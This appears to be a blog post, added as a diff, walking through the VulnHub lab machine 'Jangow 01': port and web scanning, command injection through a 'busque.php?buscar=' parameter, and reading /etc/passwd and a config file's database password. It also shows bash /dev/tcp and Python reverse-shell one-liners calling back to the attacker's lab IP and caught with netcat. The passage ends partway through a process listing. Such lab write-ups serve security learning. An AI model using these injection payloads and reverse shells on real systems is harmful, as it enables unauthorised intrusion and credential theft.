@@ -1,0 +1,1182 @@
+<meta charset="UTF-8">
+<link rel="stylesheet" href="../../../index.css"/>
+<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
+<script src="../../../highlight/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+<h1>/f0c1s/blog/sec/vulnhub/jangow01</h1>
+
+<p>
+    <a href="../../../index.html">/blog</a>
+    <a href="../../index.html">Security</a>
+    <a href="../index.html">VulnHub</a>
+    <a href="../../../sec/vulnhub/jangow01/jangow-01.html">+ Jangow01 - 2021.12.16 Thursday</a>
+</p>
+
+<h1 id="jangow-01">jangow 01</h1>
+<p><a href="http://www.vulnhub.com/entry/jangow-101,754/">VulnHub Page</a></p>
+<pre><code>Difficulty: easy
+The secret to this box is enumeration! Inquiries jangow2021@gmail.com
+This works better with VirtualBox rather than VMware ## Changelog 2021-11-04 - v1.0.1 2021-11-01 - v1.0.0 </code></pre>
+<h2 id="scanning-for-the-machine">Scanning for the machine</h2>
+<p>Jangow itself announces its IP.</p>
+<figure>
+<img src="1.IP-announcement.png" alt="" /><figcaption>1.IP-announcement</figcaption>
+</figure>
+<pre class="shell"><code>fping -aAqg 192.168.56.1/24 | tee fping.txt
+192.168.56.1
+192.168.56.2
+192.168.56.70
+192.168.56.118</code></pre>
+<figure>
+<img src="2.fping.png" alt="" /><figcaption>2.fping</figcaption>
+</figure>
+<pre class="shell"><code>export RHOST=&quot;192.168.56.118&quot;                                    
+export LHOST=&quot;192.168.56.70&quot;
+export LPORT=&quot;443&quot;</code></pre>
+<pre class="shell"><code>nmap $RHOST -n | tee nmap.default.txt
+...
+21/tcp open  ftp
+80/tcp open  http</code></pre>
+<figure>
+<img src="3.nmap-default.png" alt="" /><figcaption>3.nmap-default</figcaption>
+</figure>
+<pre class="shell"><code>nmap $RHOST -n -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
+...
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.18
+|_http-title: Index of /
+| http-ls: Volume /
+| SIZE  TIME              FILENAME
+| -     2021-06-10 18:05  site/
+|_
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: Host: 127.0.0.1; OS: Unix</code></pre>
+<figure>
+<img src="4.nmap-tcp-ports.png" alt="" /><figcaption>4.nmap-tcp-ports</figcaption>
+</figure>
+<pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt      
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.118
++ Target Hostname:    192.168.56.118
++ Target Port:        80
++ Start Time:         2021-12-16 11:18:46 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ OSVDB-3268: /: Directory indexing found.
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /./: Directory indexing found.
++ /./: Appending &#39;/./&#39; to a directory allows indexing
++ OSVDB-3268: //: Directory indexing found.
++ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
++ OSVDB-3268: /%2e/: Directory indexing found.
++ OSVDB-576: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
++ OSVDB-3268: ///: Directory indexing found.
++ OSVDB-119: /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via &#39;open directory browsing&#39;. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
++ OSVDB-119: /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via &#39;open directory browsing&#39;. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
++ OSVDB-3268: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
++ OSVDB-3288: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when       /&#39;s are requested.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 26522 requests: 0 error(s) and 18 item(s) reported on remote host
++ End Time:           2021-12-16 11:19:59 (GMT5.5) (73 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+<figure>
+<img src="5.nikto.png" alt="" /><figcaption>5.nikto</figcaption>
+</figure>
+<p><code>nmap $RHOST -n -p21,80 -Pn -T4 --min-rate=5000 -sVC --script=vuln,*enum* | tee nmap.vuln-enum.txt</code> is too much output, and is useless for now.</p>
+<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k       
+301        9l       28w      315c http://192.168.56.118/site
+301        9l       28w      322c http://192.168.56.118/site/assets
+301        9l       28w      319c http://192.168.56.118/site/css
+301        9l       28w      325c http://192.168.56.118/site/wordpress
+301        9l       28w      318c http://192.168.56.118/site/js</code></pre>
+<figure>
+<img src="6.feroxbuster.png" alt="" /><figcaption>6.feroxbuster</figcaption>
+</figure>
+<p>Refer <a href="http://blog.f0c1s.com/sec/tools/feroxbuster.html">tool - feroxbuster</a> to know a bit more about feroxbuster.</p>
+<blockquote>
+<p><code>http://192.168.56.118/site/</code></p>
+</blockquote>
+<figure>
+<img src="7.site.png" alt="" /><figcaption>7.site</figcaption>
+</figure>
+<pre class="shell"><code>curl -s http://$RHOST/site/ -A &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; | sed -n &#39;s/.*src=&quot;\([^&quot;]*\).*/\1/p&#39; | sort | uniq | tee curl.src.txt
+assets/img/bg-masthead.jpg
+assets/img/demo-image-01.jpg
+assets/img/demo-image-02.jpg
+assets/img/ipad.png
+https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js
+https://use.fontawesome.com/releases/v5.15.3/js/all.js
+js/scripts.js
+                                                                                                                   
+
+curl -s http://$RHOST/site/ -A &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; | sed -n &#39;s/.*href=&quot;\([^&quot;]*\).*/\1/p&#39; | sort | uniq | tee curl.href.txt
+#!
+#about
+assets/favicon.ico
+busque.php?buscar=
+css/styles.css
+https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i
+https://fonts.googleapis.com/css?family=Varela+Round
+https://startbootstrap.com/theme/grayscale/
+#page-top
+#projects</code></pre>
+<figure>
+<img src="8.curl-for-src-and-href.png" alt="" /><figcaption>8.curl-for-src-and-href</figcaption>
+</figure>
+<p>There is one interesting url: <code>busque.php?buscar=</code>. This looks like RCE, LFI, or RFI opportunity.</p>
+<figure>
+<img src="9.enumerating-buscar.png" alt="" /><figcaption>9.enumerating-buscar</figcaption>
+</figure>
+<figure>
+<img src="10.whoami.png" alt="" /><figcaption>10.whoami</figcaption>
+</figure>
+<blockquote>
+<p><code>http://192.168.56.118/site/busque.php?buscar=bash -c id</code> works!</p>
+</blockquote>
+<figure>
+<img src="11.bash-c-id.png" alt="" /><figcaption>11.bash-c-id</figcaption>
+</figure>
+<p><code>http://192.168.56.118/site/busque.php?buscar=bash%20-c%20bash%20-i%20%3E&amp;%20/dev/tcp/192.168.56.70/4444%200%3E&amp;1</code> and <code>http://192.168.56.118/site/busque.php?buscar=bash%20-c%20%22bash%20-i%20%3E&amp;%20/dev/tcp/192.168.56.70/4444%200%3E&amp;1%22</code> both fail</p>
+<blockquote>
+<p><code>view-source:http://192.168.56.118/site/busque.php?buscar=cat%20/etc/hosts</code></p>
+</blockquote>
+<figure>
+<img src="12.etc-hosts.png" alt="" /><figcaption>12.etc-hosts</figcaption>
+</figure>
+<pre class="shell"><code>view-source:http://192.168.56.118/site/busque.php?buscar=cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+jangow01:x:1000:1000:desafio02,,,:/home/jangow01:/bin/bash
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:111:118:ftp daemon,,,:/srv/ftp:/bin/false
+mysql:x:112:119:MySQL Server,,,:/nonexistent:/bin/false</code></pre>
+<figure>
+<img src="13.etc-passwd.png" alt="" /><figcaption>13.etc-passwd</figcaption>
+</figure>
+<p>This tells me that there is a user by the name “jangow01” and that it has a home directory of “/home/jangow01”</p>
+<blockquote>
+<p><code>view-source:http://192.168.56.118/site/busque.php?buscar=ls /home/jangow01</code></p>
+</blockquote>
+<figure>
+<img src="14.ls-home-jangow01.png" alt="" /><figcaption>14.ls-home-jangow01</figcaption>
+</figure>
+<blockquote>
+<p><code>view-source:http://192.168.56.118/site/busque.php?buscar=ls -la /home/jangow01</code></p>
+</blockquote>
+<pre><code>total 36
+drwxr-xr-x 4 jangow01 desafio02 4096 Jun 10  2021 .
+drwxr-xr-x 3 root     root      4096 Oct 31 19:04 ..
+-rw------- 1 jangow01 desafio02  200 Oct 31 19:39 .bash_history
+-rw-r--r-- 1 jangow01 desafio02  220 Jun 10  2021 .bash_logout
+-rw-r--r-- 1 jangow01 desafio02 3771 Jun 10  2021 .bashrc
+drwx------ 2 jangow01 desafio02 4096 Jun 10  2021 .cache
+drwxrwxr-x 2 jangow01 desafio02 4096 Jun 10  2021 .nano
+-rw-r--r-- 1 jangow01 desafio02  655 Jun 10  2021 .profile
+-rw-r--r-- 1 jangow01 desafio02    0 Jun 10  2021 .sudo_as_admin_successful
+-rw-rw-r-- 1 jangow01 desafio02   33 Jun 10  2021 user.txt</code></pre>
+<figure>
+<img src="15.ls-la-home-jangow01.png" alt="" /><figcaption>15.ls-la-home-jangow01</figcaption>
+</figure>
+<blockquote>
+<p>flag user.txt: <code>view-source:http://192.168.56.118/site/busque.php?buscar=cat /home/jangow01/user.txt</code></p>
+</blockquote>
+<pre class="shell"><code>d41d8cd98f00b204e9800998ecf8427e</code></pre>
+<figure>
+<img src="16.user-flag.png" alt="" /><figcaption>16.user-flag</figcaption>
+</figure>
+<blockquote>
+<p><code>find</code> works?</p>
+</blockquote>
+<pre class="shell"><code>view-source:http://192.168.56.118/site/busque.php?buscar=find / -perm -4000 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/ubuntu-core-launcher
+/usr/bin/sudo
+/usr/bin/gpasswd
+/bin/fusermount
+/bin/ping
+/bin/su
+/bin/ntfs-3g
+/bin/umount
+/bin/ping6
+/bin/mount</code></pre>
+<figure>
+<img src="17.find-set-SUID-binaries.png" alt="" /><figcaption>17.find-set-SUID-binaries</figcaption>
+</figure>
+<blockquote>
+<p><code>which python3</code></p>
+</blockquote>
+<p>Well, there is no python, but python3 is available.</p>
+<figure>
+<img src="18.which-python3.png" alt="" /><figcaption>18.which-python3</figcaption>
+</figure>
+<blockquote>
+<p>Python reverse shell</p>
+</blockquote>
+<div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a>python3 <span class="op">-</span>c <span class="st">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.66&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span></span></code></pre></div>
+<p>I was not able to get a connection on <code>4444</code>, but then received a connection on <code>443</code>.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a>python3 <span class="op">-</span>c <span class="st">&#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.66&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</span></span></code></pre></div>
+<pre class="shell"><code>sudo nc -nlvp 443 -s $LHOST
+[sudo] password for f0c1s: 
+Listening on 192.168.56.70 443
+Connection received on 192.168.56.118 38332
+$ whoami
+whoami
+www-data
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ hostname
+hostname
+jangow01
+$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       desafio02
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+$ date
+date
+Thu Dec 16 10:25:10 BRST 2021</code></pre>
+<figure>
+<img src="19.caught-shell.png" alt="" /><figcaption>19.caught-shell</figcaption>
+</figure>
+<pre class="shell"><code>$ ls -lahR /home
+ls -lahR /home
+/home:
+total 12K
+drwxr-xr-x  3 root     root      4.0K Oct 31 19:04 .
+drwxr-xr-x 24 root     root      4.0K Jun 10  2021 ..
+drwxr-xr-x  4 jangow01 desafio02 4.0K Jun 10  2021 jangow01
+
+/home/jangow01:
+total 36K
+drwxr-xr-x 4 jangow01 desafio02 4.0K Jun 10  2021 .
+drwxr-xr-x 3 root     root      4.0K Oct 31 19:04 ..
+-rw------- 1 jangow01 desafio02  200 Oct 31 19:39 .bash_history
+-rw-r--r-- 1 jangow01 desafio02  220 Jun 10  2021 .bash_logout
+-rw-r--r-- 1 jangow01 desafio02 3.7K Jun 10  2021 .bashrc
+drwx------ 2 jangow01 desafio02 4.0K Jun 10  2021 .cache
+drwxrwxr-x 2 jangow01 desafio02 4.0K Jun 10  2021 .nano
+-rw-r--r-- 1 jangow01 desafio02  655 Jun 10  2021 .profile
+-rw-r--r-- 1 jangow01 desafio02    0 Jun 10  2021 .sudo_as_admin_successful
+-rw-rw-r-- 1 jangow01 desafio02   33 Jun 10  2021 user.txt
+ls: cannot open directory &#39;/home/jangow01/.cache&#39;: Permission denied
+
+/home/jangow01/.nano:
+total 8.0K
+drwxrwxr-x 2 jangow01 desafio02 4.0K Jun 10  2021 .
+drwxr-xr-x 4 jangow01 desafio02 4.0K Jun 10  2021 ..
+$ 
+
+$ cat /home/jangow01/user.txt
+cat /home/jangow01/user.txt
+d41d8cd98f00b204e9800998ecf8427e</code></pre>
+<figure>
+<img src="20.user-flag-again.png" alt="" /><figcaption>20.user-flag-again</figcaption>
+</figure>
+<blockquote>
+<p>Find config or password?</p>
+</blockquote>
+<pre class="shell"><code>$ whoami
+whoami
+www-data
+$ cd
+cd
+$ pwd
+pwd
+/var/www/html/site
+$ ls -lahR ./
+ls -lahR ./
+./:
+total 40K
+drwxr-xr-x 6 www-data www-data 4.0K Jun 10  2021 .
+drwxr-xr-x 3 root     root     4.0K Oct 31 19:36 ..
+drwxr-xr-x 3 www-data www-data 4.0K Jun  3  2021 assets
+-rw-r--r-- 1 www-data www-data   35 Jun 10  2021 busque.php
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2021 css
+-rw-r--r-- 1 www-data www-data  10K Jun 10  2021 index.html
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2021 js
+drwxr-xr-x 2 www-data www-data 4.0K Jun 10  2021 wordpress
+
+./assets:
+total 36K
+drwxr-xr-x 3 www-data www-data 4.0K Jun  3  2021 .
+drwxr-xr-x 6 www-data www-data 4.0K Jun 10  2021 ..
+-rw-r--r-- 1 www-data www-data  23K Jun  3  2021 favicon.ico
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2021 img
+
+./assets/img:
+total 1.1M
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2021 .
+drwxr-xr-x 3 www-data www-data 4.0K Jun  3  2021 ..
+-rw-r--r-- 1 www-data www-data 213K Jun  3  2021 bg-masthead.jpg
+-rw-r--r-- 1 www-data www-data 523K Jun  3  2021 bg-signup.jpg
+-rw-r--r-- 1 www-data www-data  17K Jun  3  2021 demo-image-01.jpg
+-rw-r--r-- 1 www-data www-data 103K Jun  3  2021 demo-image-02.jpg
+-rw-r--r-- 1 www-data www-data 231K Jun  3  2021 ipad.png
+
+./css:
+total 212K
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2021 .
+drwxr-xr-x 6 www-data www-data 4.0K Jun 10  2021 ..
+-rw-r--r-- 1 www-data www-data 203K Jun  3  2021 styles.css
+
+./js:
+total 12K
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2021 .
+drwxr-xr-x 6 www-data www-data 4.0K Jun 10  2021 ..
+-rw-r--r-- 1 www-data www-data 1.7K Jun  3  2021 scripts.js
+
+./wordpress:
+total 24K
+drwxr-xr-x 2 www-data www-data 4.0K Jun 10  2021 .
+drwxr-xr-x 6 www-data www-data 4.0K Jun 10  2021 ..
+-rw-r--r-- 1 www-data www-data  347 Jun 10  2021 config.php
+-rw-r--r-- 1 www-data www-data  10K Jun 10  2021 index.html</code></pre>
+<figure>
+<img src="21.find-config-php.png" alt="" /><figcaption>21.find-config-php</figcaption>
+</figure>
+<blockquote>
+<p>find user:pass</p>
+</blockquote>
+<pre class="shell"><code>$ cat wordpress/config.php | grep -i &quot;user\|pass&quot;
+cat wordpress/config.php | grep -i &quot;user\|pass&quot;
+$username = &quot;desafio02&quot;;
+$password = &quot;abygurl69&quot;;
+$conn = mysqli_connect($servername, $username, $password, $database);</code></pre>
+<figure>
+<img src="22.find-user-pass.png" alt="" /><figcaption>22.find-user-pass</figcaption>
+</figure>
+<blockquote>
+<p>find if <code>mysql</code> is running</p>
+</blockquote>
+<pre class="shell"><code>$ ps -ef | grep -i mysql
+ps -ef | grep -i mysql
+mysql     2769     1  0 09:13 ?        00:00:02 /usr/sbin/mysqld
+www-data  3463  3455  0 10:32 pts/1    00:00:00 grep -i mysql</code></pre>
+<blockquote>
+<p>Here are the rest of processes though</p>
+</blockquote>
+<pre class="shell"><code>$ ps -ef
+ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 09:13 ?        00:00:01 /sbin/init
+root         2     0  0 09:13 ?        00:00:00 [kthreadd]
+root         3     2  0 09:13 ?        00:00:00 [ksoftirqd/0]
+root         5     2  0 09:13 ?        00:00:00 [kworker/0:0H]
+root         7     2  0 09:13 ?        00:00:00 [rcu_sched]
+root         8     2  0 09:13 ?        00:00:00 [rcu_bh]
+root         9     2  0 09:13 ?        00:00:00 [migration/0]
+root        10     2  0 09:13 ?        00:00:00 [watchdog/0]
+root        11     2  0 09:13 ?        00:00:00 [kdevtmpfs]
+root        12     2  0 09:13 ?        00:00:00 [netns]
+root        13     2  0 09:13 ?        00:00:00 [perf]
+root        14     2  0 09:13 ?        00:00:00 [khungtaskd]
+root        15     2  0 09:13 ?        00:00:00 [writeback]
+root        16     2  0 09:13 ?        00:00:00 [ksmd]
+root        17     2  0 09:13 ?        00:00:00 [khugepaged]
+root        18     2  0 09:13 ?        00:00:00 [crypto]
+root        19     2  0 09:13 ?        00:00:00 [kintegrityd]
+root        20     2  0 09:13 ?        00:00:00 [bioset]
+root        21     2  0 09:13 ?        00:00:00 [kblockd]
+root        22     2  0 09:13 ?        00:00:00 [ata_sff]
+root        23     2  0 09:13 ?        00:00:00 [md]
+root        24     2  0 09:13 ?        00:00:00 [devfreq_wq]
+root        28     2  0 09:13 ?        00:00:00 [kswapd0]
+root        29     2  0 09:13 ?        00:00:00 [vmstat]
+root        30     2  0 09:13 ?        00:00:00 [fsnotify_mark]
+root        31     2  0 09:13 ?        00:00:00 [ecryptfs-kthrea]
+root        47     2  0 09:13 ?        00:00:00 [kthrotld]
+root        48     2  0 09:13 ?        00:00:00 [acpi_thermal_pm]
+root        49     2  0 09:13 ?        00:00:00 [bioset]
+root        50     2  0 09:13 ?        00:00:00 [bioset]
+root        51     2  0 09:13 ?        00:00:00 [bioset]
+root        52     2  0 09:13 ?        00:00:00 [bioset]
+root        53     2  0 09:13 ?        00:00:00 [bioset]
+root        54     2  0 09:13 ?        00:00:00 [bioset]
+root        55     2  0 09:13 ?        00:00:00 [bioset]
+root        56     2  0 09:13 ?        00:00:00 [bioset]
+root        57     2  0 09:13 ?        00:00:00 [bioset]
+root        58     2  0 09:13 ?        00:00:00 [bioset]
+root        59     2  0 09:13 ?        00:00:00 [bioset]
+root        60     2  0 09:13 ?        00:00:00 [bioset]
+root        61     2  0 09:13 ?        00:00:00 [bioset]
+root        62     2  0 09:13 ?        00:00:00 [bioset]
+root        63     2  0 09:13 ?        00:00:00 [bioset]
+root        64     2  0 09:13 ?        00:00:00 [bioset]
+root        65     2  0 09:13 ?        00:00:00 [bioset]
+root        66     2  0 09:13 ?        00:00:00 [bioset]
+root        67     2  0 09:13 ?        00:00:00 [bioset]
+root        68     2  0 09:13 ?        00:00:00 [bioset]
+root        69     2  0 09:13 ?        00:00:00 [bioset]
+root        70     2  0 09:13 ?        00:00:00 [bioset]
+root        71     2  0 09:13 ?        00:00:00 [bioset]
+root        72     2  0 09:13 ?        00:00:00 [bioset]
+root        76     2  0 09:13 ?        00:00:00 [ipv6_addrconf]
+root        89     2  0 09:13 ?        00:00:00 [deferwq]
+root        90     2  0 09:13 ?        00:00:00 [charger_manager]
+root       176     2  0 09:13 ?        00:00:00 [ttm_swap]
+root       207     2  0 09:13 ?        00:00:00 [kpsmoused]
+root       544     2  0 09:13 ?        00:00:00 [scsi_eh_0]
+root       547     2  0 09:13 ?        00:00:00 [scsi_tmf_0]
+root       551     2  0 09:13 ?        00:00:00 [scsi_eh_1]
+root       552     2  0 09:13 ?        00:00:00 [scsi_tmf_1]
+root       553     2  0 09:13 ?        00:00:00 [scsi_eh_2]
+root       554     2  0 09:13 ?        00:00:00 [scsi_tmf_2]
+root       555     2  0 09:13 ?        00:00:00 [scsi_eh_3]
+root       556     2  0 09:13 ?        00:00:00 [scsi_tmf_3]
+root       557     2  0 09:13 ?        00:00:00 [scsi_eh_4]
+root       558     2  0 09:13 ?        00:00:00 [scsi_tmf_4]
+root       559     2  0 09:13 ?        00:00:00 [scsi_eh_5]
+root       560     2  0 09:13 ?        00:00:00 [scsi_tmf_5]
+root       561     2  0 09:13 ?        00:00:00 [scsi_eh_6]
+root       562     2  0 09:13 ?        00:00:00 [scsi_tmf_6]
+root       563     2  0 09:13 ?        00:00:00 [scsi_eh_7]
+root       564     2  0 09:13 ?        00:00:00 [scsi_tmf_7]
+root       565     2  0 09:13 ?        00:00:00 [scsi_eh_8]
+root       566     2  0 09:13 ?        00:00:00 [scsi_tmf_8]
+root       567     2  0 09:13 ?        00:00:00 [scsi_eh_9]
+root       568     2  0 09:13 ?        00:00:00 [scsi_tmf_9]
+root       569     2  0 09:13 ?        00:00:00 [scsi_eh_10]
+root       570     2  0 09:13 ?        00:00:00 [scsi_tmf_10]
+root       571     2  0 09:13 ?        00:00:00 [scsi_eh_11]
+root       572     2  0 09:13 ?        00:00:00 [scsi_tmf_11]
+root       573     2  0 09:13 ?        00:00:00 [scsi_eh_12]
+root       574     2  0 09:13 ?        00:00:00 [scsi_tmf_12]
+root       575     2  0 09:13 ?        00:00:00 [scsi_eh_13]
+root       576     2  0 09:13 ?        00:00:00 [scsi_tmf_13]
+root       577     2  0 09:13 ?        00:00:00 [scsi_eh_14]
+root       578     2  0 09:13 ?        00:00:00 [scsi_tmf_14]
+root       579     2  0 09:13 ?        00:00:00 [scsi_eh_15]
+root       580     2  0 09:13 ?        00:00:00 [scsi_tmf_15]
+root       581     2  0 09:13 ?        00:00:00 [scsi_eh_16]
+root       582     2  0 09:13 ?        00:00:00 [scsi_tmf_16]
+root       583     2  0 09:13 ?        00:00:00 [scsi_eh_17]
+root       584     2  0 09:13 ?        00:00:00 [scsi_tmf_17]
+root       585     2  0 09:13 ?        00:00:00 [scsi_eh_18]
+root       586     2  0 09:13 ?        00:00:00 [scsi_tmf_18]
+root       587     2  0 09:13 ?        00:00:00 [scsi_eh_19]
+root       588     2  0 09:13 ?        00:00:00 [scsi_tmf_19]
+root       589     2  0 09:13 ?        00:00:00 [scsi_eh_20]
+root       590     2  0 09:13 ?        00:00:00 [scsi_tmf_20]
+root       591     2  0 09:13 ?        00:00:00 [scsi_eh_21]
+root       592     2  0 09:13 ?        00:00:00 [scsi_tmf_21]
+root       593     2  0 09:13 ?        00:00:00 [scsi_eh_22]
+root       594     2  0 09:13 ?        00:00:00 [scsi_tmf_22]
+root       595     2  0 09:13 ?        00:00:00 [scsi_eh_23]
+root       596     2  0 09:13 ?        00:00:00 [scsi_tmf_23]
+root       597     2  0 09:13 ?        00:00:00 [scsi_eh_24]
+root       598     2  0 09:13 ?        00:00:00 [scsi_tmf_24]
+root       599     2  0 09:13 ?        00:00:00 [scsi_eh_25]
+root       600     2  0 09:13 ?        00:00:00 [scsi_tmf_25]
+root       601     2  0 09:13 ?        00:00:00 [scsi_eh_26]
+root       602     2  0 09:13 ?        00:00:00 [scsi_tmf_26]
+root       603     2  0 09:13 ?        00:00:00 [scsi_eh_27]
+root       604     2  0 09:13 ?        00:00:00 [scsi_tmf_27]
+root       605     2  0 09:13 ?        00:00:00 [scsi_eh_28]
+root       606     2  0 09:13 ?        00:00:00 [scsi_tmf_28]
+root       607     2  0 09:13 ?        00:00:00 [scsi_eh_29]
+root       608     2  0 09:13 ?        00:00:00 [scsi_tmf_29]
+root       640     2  0 09:13 ?        00:00:00 [bioset]
+root       907     2  0 09:13 ?        00:00:00 [raid5wq]
+root       944     2  0 09:13 ?        00:00:00 [bioset]
+root       984     2  0 09:13 ?        00:00:00 [kworker/0:1H]
+root       986     2  0 09:13 ?        00:00:00 [jbd2/sda1-8]
+root       987     2  0 09:13 ?        00:00:00 [ext4-rsv-conver]
+root      1031     2  0 09:13 ?        00:00:01 [kworker/0:3]
+root      1047     2  0 09:13 ?        00:00:00 [iscsi_eh]
+root      1048     1  0 09:13 ?        00:00:00 /lib/systemd/systemd-journald
+root      1058     2  0 09:13 ?        00:00:00 [ib_addr]
+root      1065     2  0 09:13 ?        00:00:00 [kauditd]
+root      1083     1  0 09:13 ?        00:00:00 /sbin/lvmetad -f
+root      1091     2  0 09:13 ?        00:00:00 [ib_mcast]
+root      1092     2  0 09:13 ?        00:00:00 [ib_nl_sa_wq]
+root      1096     1  0 09:13 ?        00:00:00 /lib/systemd/systemd-udevd
+root      1100     2  0 09:13 ?        00:00:00 [ib_cm]
+root      1103     2  0 09:13 ?        00:00:00 [iw_cm_wq]
+root      1105     2  0 09:13 ?        00:00:00 [rdma_cm]
+systemd+  1470     1  0 09:13 ?        00:00:00 /lib/systemd/systemd-timesyncd
+root      1703     2  0 09:13 ?        00:00:00 [iprt-VBoxWQueue]
+root      1937     1  0 09:13 ?        00:00:00 /usr/lib/accountsservice/account
+root      1944     1  0 09:13 ?        00:00:00 /usr/sbin/cron -f
+syslog    1950     1  0 09:13 ?        00:00:00 /usr/sbin/rsyslogd -n
+message+  1955     1  0 09:13 ?        00:00:00 /usr/bin/dbus-daemon --system --
+daemon    1994     1  0 09:13 ?        00:00:00 /usr/sbin/atd -f
+root      1995     1  0 09:13 ?        00:00:00 /lib/systemd/systemd-logind
+root      1997     1  0 09:13 ?        00:00:00 /usr/bin/lxcfs /var/lib/lxcfs/
